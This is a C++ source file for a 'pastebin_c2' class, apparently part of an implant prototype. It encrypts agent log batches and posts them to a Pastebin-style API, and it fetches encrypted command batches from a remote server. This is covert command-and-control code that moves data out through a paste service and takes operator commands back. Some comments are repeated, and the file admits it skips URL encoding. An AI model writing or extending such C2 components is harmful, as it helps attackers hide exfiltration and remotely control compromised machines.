#include "pastebin.h"
#include <iostream>
#include <ctime>

pastebin_c2::pastebin_c2(Comm* comm_module, crypto_encoder* encoder, const std::wstring& base_url)
    : comm_module(comm_module), encoder(encoder), last_synced_time(0), base_url(base_url) {}

void pastebin_c2::sync_time() {
    // In a real implementation, we would perform a HEAD request to get the Date header.
    // For this prototype, we will simulate getting the time or use system time if network time isn't available.
    last_synced_time = std::time(nullptr);
}

std::string pastebin_c2::post_logs(const LogBatch& logs) {
    if (!comm_module || !encoder) return "";

    // 1. Sync time
    sync_time();
    
    // 2. Serialize Logs to JSON
    json j = logs;
    std::string data = j.dump();

    // 3. Set context for encryption
    // For logs, we might use the current timestamp as the hint source
    std::string hint = "log_batch"; 
    encoder->set_key_context(last_synced_time, hint);

    // 4. Encrypt the data
    std::string encrypted_data = encoder->encrypt(data);

    // 5. Send the request
    // 5. Send the request
    // 5. Send the request (Form Encoded)
#ifdef DEBUG
    std::string url_str(base_url.begin(), base_url.end());
    std::cout << "[DEBUG] Posting logs to " << url_str << std::endl;
#endif

    // Construct form data: api_dev_key=...&api_paste_code=<encrypted_data>
    // Note: In a real app, we must URL-encode the data!
    // For this prototype, assuming base64 output from encryptor is URL-safe enough or we skip encoding for simplicity
    // (Base64 uses +, /, = which need encoding. If encryptor returns hex, it's fine.)
    // Let's assume hex for now or just send raw and hope server handles it (it won't if strict).
    // Ideally we need a UrlEncode function.
    
    std::string post_body = "api_dev_key=debug_key&api_paste_code=" + encrypted_data + "&api_paste_name=agent_logs";
    std::wstring headers = L"Content-Type: application/x-www-form-urlencoded";

    std::string response = comm_module->SendRequest(
        base_url, 
        8080, // Using 8080 for debug/local
        L"/api/api_post.php", 
        L"POST", 
        post_body,
        headers
    );

    return response;
}

CommandBatch pastebin_c2::fetch_commands(const std::wstring& url) {
    CommandBatch batch;
    if (!comm_module || !encoder) return batch;

    // 1. Sync time
    sync_time();

    std::wstring server = base_url;
    std::wstring path = url;

#ifdef DEBUG
    // Simple conversion for debug output
    std::string server_str;
    for(wchar_t c : server) server_str += (char)c;
    std::cout << "[DEBUG] Fetching commands from " << server_str << std::endl;
#endif

    // 2. Fetch the data
    std::string encrypted_response = comm_module->SendRequest(
        server, 
        8080, // Using 8080 for debug/local
        path, 
        L"GET"
    );

    if (encrypted_response.empty()) return batch;

    // 3. Check for Plaintext JSON (Debug/Mock Mode)
    if (!encrypted_response.empty() && encrypted_response.front() == '{') {
#ifdef DEBUG
        std::cout << "[DEBUG] Detected plaintext JSON response, skipping decryption." << std::endl;
#endif
        try {
            json j = json::parse(encrypted_response);
            batch = j.get<CommandBatch>();
            return batch;
        } catch (const std::exception& e) {
            std::cerr << "[DEBUG] JSON Parse/Conversion Error (Plaintext): " << e.what() << std::endl;
        } catch (...) {
            std::cerr << "[DEBUG] Unknown error parsing plaintext JSON" << std::endl;
        }
    }

    // 4. Set context for decryption
    std::string hint = "cmd_batch"; 
    encoder->set_key_context(last_synced_time, hint);

    // 5. Decrypt the data
    std::string decrypted_data = encoder->decrypt(encrypted_response);

    // 6. Parse JSON
    try {
        json j = json::parse(decrypted_data);
        batch = j.get<CommandBatch>();
    } catch (json::parse_error& e) {
        std::cerr << "JSON Parse Error: " << e.what() << std::endl;
    }

    return batch;
}
